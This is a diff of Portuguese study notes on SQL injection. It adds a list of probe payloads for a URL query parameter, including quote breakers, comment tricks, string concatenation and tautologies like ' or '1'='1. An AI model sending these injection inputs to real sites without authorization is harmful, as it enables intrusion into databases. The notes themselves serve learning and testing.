@@ -44,7 +44,23 @@ Exemplo de uso de um banco de dados msql:
 - > ( Injeção SQL )
  - É uma falha que explora o tratamento de entrada nos formulários através da manipulação de parâmetros da URL (GET) ou formulários (POST), os quais enviam informações que alimentam o bando de dados SQL.
  - Conteúdo injetado: 
-	', 
+
+	/?q=1
+	/?q=1'
+	/?q=1"
+	/?q=[1]
+	/?q[]=1
+	/?q=1`
+	/?q=1\
+	/?q=1/*'*/
+	/?q=1/*!1111'*/
+	/?q=1'||'asd'||'   <== concat string
+	/?q=1' or '1'='1
+	/?q=1 or 1=1
+	/?q='or''='
+	/?q=")
+	/?q=')
+	/?q=-x() 
    -------------------------------------------------	 TIPOS DE SQLinjection:      ----------------------------------------------------- 
 
 1 ) IN-BAND SQLi (SQLI Clássico)
